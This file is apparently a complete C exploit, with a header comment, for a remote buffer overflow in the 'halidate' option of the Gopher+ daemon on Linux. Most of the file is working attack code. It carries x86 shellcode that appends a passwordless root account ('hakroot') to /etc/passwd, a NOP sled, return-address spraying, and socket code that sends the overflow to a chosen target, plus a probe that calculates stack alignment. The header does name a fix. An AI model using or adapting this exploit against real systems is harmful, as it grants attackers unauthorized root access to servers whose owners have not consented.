/*  (linux)Gopher+[v2.3.1p0-]:  Daemon  remote  buffer 
overflow.
    Findings   and   exploit  by:  v9[v9@fakehalo.org]. 
(vade79)

    It  is  possible  to exploit an unchecked sprintf call
in the
    "halidate"  option  in  gopherd.c.  This exploit will
attempt 
    to   write   a   line   to   /etc/passwd.    (as a
superuser)

    The  gopher+  daemon  has  multiple  overflows  in 
different
    functions,  but  most overwrite the pointer(s) with
hardcoded
    data   from   the   program  which  are  limited.  
But,  the
    "halidate"  option/call  was  a little hidden suprise
for me.

    When  the  exploit  is sucessfully executed it adds the
line:
    "hakroot::0:0:hacked:/:/bin/sh"   to   /etc/passwd, 
with  no
    0x0A   return,   which  could  cause  some  problems  in
some
    situations.   You  may  have  to wait till someone on
the box
    modifies  their  /etc/passwd  by  adding  a user or what
not.

   Syntax:
    [syntax]: ./xgopher <target> [port] [offset]
[alignment].
    [syntax]: ./xgopher <target> <[port] [-getalignment]>.

   Explaination:
    If you don't know what the alignment of the server is,
(which
    isn't  expected  *g*)  just  type  "./xgopher hostname
[port]
    -getalignment" and with aligment you're given type
"./xgopher
    hostname <port> <offset> <alignment response you are
given>".

   Info: 
    The  following  segment  is  from gopherd.c [line
1076/3453]:
    ("pathname"  in  the  code  segment  is supplied by the
user)

--------------------------------------------------------------------------------
void
OutputAuthForm(int sockfd, char *pathname, char *host, int
port, CMDprotocol p)
{
     char tmpbuf[512];
     ...
     sprintf(tmpbuf,
             "<FORM METHOD=\"GET\"
ACTION=\"http://%s:%d/halidate%%20%s\">\r\n",
             host, port, pathname);
     ...
}
--------------------------------------------------------------------------------

   Notes:
    This  exploit requires that the service is running as
root(to
    write  to  /etc/passwd).  Even if the gopher+ daemon
displays
    itself  running  as  another user, as long as it's
process is
    running as root(uid=0) it should exploit successfully. 
Do to
    the  servers  local  host+port character lengths
changing the
    alignment  will  almost  never be the same, I recommend
using
    the  -getalignment  parameter.  You  can  play as much
as you
    want  on  this,  the  process  is  forked and won't
crash the
    gopher+  daemon  with invalid pointers.  This was also
tested
    effective   on   the  2.3  version  of  the  gopher+ 
daemon.
    Although  this  exploit  is  for linux servers, gopher+
isn't
    just  built for linux, it is also supported for BSD,
Solaris,
    SunOS,     HP-UX     and     other     operation    
systems.

   Fix:
    Compile  with "./configure --disable-auth" (isn't
disabled by
    default)  and  then  recompile  gopher  or  wait for a
patch.

   Tests:
    Built  and  tested  on slackware 3.6 and slackware 7.0
linux.
    (with   lots   of   junk   added   to   my  /etc/passwd 
*g*)
*/
#define BSIZE 512               // buffer size. (tmpbuf[512]
minus server data)
#define PADDING 150             // ret reps. (host+port
length guessing room)
#define POINTER 0xbffff65c      // base pointer in which
offsets are added.
#define DEFAULT_PORT 70         // default gopher+ daemon
port.
#define DEFAULT_OFFSET 0        // default offset. (argument
is added)
#define DEFAULT_ALIGN 0         // alignment. (depends on
host+port length)
#define TIMEOUT 5               // connection timeout time.
#include <signal.h>
#include <netinet/in.h>
#include <netdb.h>
static char exec[]= // appends
"hakroot::0:0:hacked:/:/bin/sh" to /etc/passwd.

"\xeb\x03\x5f\xeb\x05\xe8\xf8\xff\xff\xff\x31\xdb\xb3\x35\x01\xfb\x30\xe4\x88"

"\x63\x0b\x31\xc9\x66\xb9\x01\x04\x31\xd2\x66\xba\xa4\x01\x31\xc0\xb0\x05\xcd"

"\x80\x89\xc3\x31\xc9\xb1\x5b\x01\xf9\x31\xd2\xb2\x1d\x31\xc0\xb0\x04\xcd\x80"

"\x31\xc0\xb0\x01\xcd\x80\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x01\x90"

"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

"\x90\x90\x90\x90\x90\x90\x68\x61\x6b\x72\x6f\x6f\x74\x3a\x3a\x30\x3a\x30\x3a"

"\x68\x61\x63\x6b\x65\x64\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68";
void timeout(){printf("[timeout]: Connection
timeout(%d).\n",TIMEOUT);quit(-1);}
int main(int argc,char **argv){
 char bof[BSIZE];
 int i,sock,port,offset,align,ga=0;
 long ret=DEFAULT_OFFSET;
 struct hostent *t;
 struct sockaddr_in s;
 printf("*** (linux)Gopherd+[v2.3.1p0-]: Remote buffer
overflow, by: v9[v9@fake"
 "halo.org].\n");
 if(argc<2){
  printf("[syntax]: %s <target> [port] [offset]
[alignment].\n",argv[0]);
  printf("[syntax]: %s <target> <[port]
[-getalignment]>.\n",argv[0]);
  quit(0);
 }
 if(argc>2){

if(!strcmp(argv[2],"-getalignment")){ga=1;port=DEFAULT_PORT;}
  else{port=atoi(argv[2]);}
 }
 else{port=DEFAULT_PORT;}
 if(argc>3){
  if(!strcmp(argv[3],"-getalignment")){ga=1;}
  else{offset=atoi(argv[3]);}
 }
 else{offset=DEFAULT_OFFSET;}
 if(argc>4){
  if(atoi(argv[4])<0||atoi(argv[4])>3){
   printf("[ignored]: Invalid alignment, using default
alignment. (0-3)\n");
   align=DEFAULT_ALIGN;
  }
  else{align=atoi(argv[4]);}
 }
 else{align=DEFAULT_ALIGN;}
 if(ga){getalignment(argv[1],port);}
 else{
  ret=(POINTER+offset);
  printf("[stats]: Addr: 0x%lx, Offset: %d, Align: %d, Size:
%d, Padding: %d.\n"
  ,ret,offset,align,BSIZE,PADDING);
  for(i=align;i<BSIZE;i+=4){*(long *)&bof[i]=ret;}
 
for(i=0;i<(BSIZE-strlen(exec)-PADDING);i++){*(bof+i)=0x90;}
  memcpy(bof+i,exec,strlen(exec));
  memcpy(bof,"halidate ",9);
  bof[BSIZE]='\0';
  if(s.sin_addr.s_addr=inet_addr(argv[1])){
   if(!(t=gethostbyname(argv[1]))){
    printf("[error]: Couldn't resolve. (%s)\n",argv[1]);
    quit(-1);
   }
  
memcpy((char*)&s.sin_addr,(char*)t->h_addr,sizeof(s.sin_addr));
  }
  s.sin_family=AF_INET;
  s.sin_port=htons(port);
  sock=socket(AF_INET,SOCK_STREAM,0);
  signal(SIGALRM,timeout);
  printf("[data]: Attempting to connect to %s on port
%d.\n",argv[1],port);
  alarm(TIMEOUT);
  if(connect(sock,(struct sockaddr_in*)&s,sizeof(s))){
   printf("[error]: Connection failed. (port=%d)\n",port);
   quit(-1);
  }
  alarm(0);
  printf("[data]: Connected successfully.
(port=%d)\n",port);
  printf("[data]: Sending buffer(%d) to
server.\n",strlen(bof));
  write(sock,bof,strlen(bof));
  usleep(500000);
  printf("[data]: Closing socket.\n");
  close(sock);
 }
 quit(0);
}
int getalignment(char *target,int port){
 char buf[1024];
 int i,j,si,sock,math;
 struct hostent *t;
 struct sockaddr_in s;
 if(s.sin_addr.s_addr=inet_addr(target)){
  if(!(t=gethostbyname(target))){
   printf("[error]: Couldn't resolve. (%s)\n",target);
   quit(-1);
  }
 
memcpy((char*)&s.sin_addr,(char*)t->h_addr,sizeof(s.sin_addr));
 }
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 sock=socket(AF_INET,SOCK_STREAM,0);
 signal(SIGALRM,timeout);
 printf("[data]: Attempting to connect to %s on port
%d.\n",target,port);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr_in*)&s,sizeof(s))){
  printf("[error]: Connection failed. (port=%d)\n",port);
  quit(-1);
 }
 alarm(0);
 printf("[data]: Connected successfully. (port=%d)\n",port);
 alarm(TIMEOUT);
 write(sock,"halidate \n",10);
 for(i=0;i<2;i++){if(!read(sock,buf,1024)){si++;}}
 i=0;while(buf[i]&&!(buf[i]==0x4E)){i++;}
 j=0;while(buf[j]&&!(buf[j]==0x25)){j++;}
 usleep(500000);
 printf("[data]: Closing socket.\n");
 close(sock);
 if(!si||i>=j||strlen(buf)<64){
  printf("[error]: Too minimal or invalid data recieved to
calculate. (try agai"
  "n?)\n");
  quit(-1);
 }
 else{
  math=(i-j-2);
  while(math<0){math+=4;}
  printf("[data]: Alignment calculation: %d.\n",math);
 }
}
int quit(int i){
 if(i){
  printf("[exit]: Dirty exit.\n");
  exit(0);
 }
 else{
  printf("[exit]: Clean exit.\n");
  exit(-1);
 }
}
